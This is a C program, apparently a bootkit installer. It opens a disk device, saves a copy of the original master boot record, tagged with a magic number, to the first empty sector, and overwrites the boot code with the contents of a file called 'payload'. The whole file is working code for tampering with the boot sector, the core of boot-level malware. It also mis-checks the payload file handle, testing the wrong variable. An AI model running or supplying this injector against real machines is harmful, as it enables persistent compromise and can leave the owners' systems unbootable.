#include <stdio.h>
#include <string.h>

#define SECTOR_SIZE 512
#define BOOT_SIGNATURE "\x55\xAA"
#define ASM_JMP '\xEB'
#define MAX_PAYLOAD_LEN 0x1B8
#define BACKUP_MAGIC "\x13\x37\xd0\x0d"

int main(int argc, char *argv[]) {
	FILE * fp;
	FILE * payloadfp;
	char mbr[SECTOR_SIZE];
	char readbuf[SECTOR_SIZE];
	char payload[MAX_PAYLOAD_LEN];
	int payloadlen;
	unsigned int newMBROffset;

	if (argc != 2) {
		printf("Usage: '%s DEVICE'\n", argv[0]);
		return 1;
	}
	
	printf("Injecting to %s\n", argv[1]);
	
	fp = fopen(argv[1], "r+");
	if (fp == NULL) {
		printf("Could not open %s for read/write. Are you sure you have permission?\n", argv[1]);
		return 1;
	}
	
	fread(&mbr, SECTOR_SIZE, 1, fp);
	
	// sanity checks:
	
	if (memcmp(&mbr[0x1FE], BOOT_SIGNATURE, 2)) {
		printf("Could not find boot signature. Aborting!\n");
		fclose(fp);
		return 1;
	}
	
	if (mbr[0] != ASM_JMP) { // this is only a heuristic for added safety
		printf("No bootcode detected. Aborting!\n");
		fclose(fp);
		return 1;
	}
	
	// end sanity checks
	// start looking for a new home for the MBR
	
	char isUsed = 1;
	while (isUsed) {
		fread(&readbuf, SECTOR_SIZE, 1, fp);
		for (int i = isUsed = 0; i < SECTOR_SIZE; isUsed |= readbuf[i++]);
	}
	newMBROffset = ftell(fp) - SECTOR_SIZE;
	
	printf("Empty sector found at offset 0x%08x. Copying original MBR.\n", newMBROffset);
	// make MBR copy:
	memcpy(&mbr[SECTOR_SIZE-strlen(BACKUP_MAGIC)], BACKUP_MAGIC, strlen(BACKUP_MAGIC));// add a magic number at the end of the file so we can find it later.
	fseek(fp, newMBROffset, SEEK_SET);
	fwrite(&mbr, SECTOR_SIZE, 1, fp);

	// overwrite the original MBR
	payloadfp = fopen("payload", "r");
	if (payload == NULL) {
		printf("Failed opening payload file.\n");
		fclose(fp);
		return 1;
	}

	if ((payloadlen = fread(&payload, 1, MAX_PAYLOAD_LEN, payloadfp)) == MAX_PAYLOAD_LEN) {
		printf("Payload too long!\n");
		fclose(fp);
		fclose(payloadfp);
		return 1;
	}
	
	fseek(fp, 0, SEEK_SET);
	fwrite(&payload, 1, payloadlen, fp);

	printf("Done writing payload!\n");

	fclose(fp);
	fclose(payloadfp);
	return 0;
}
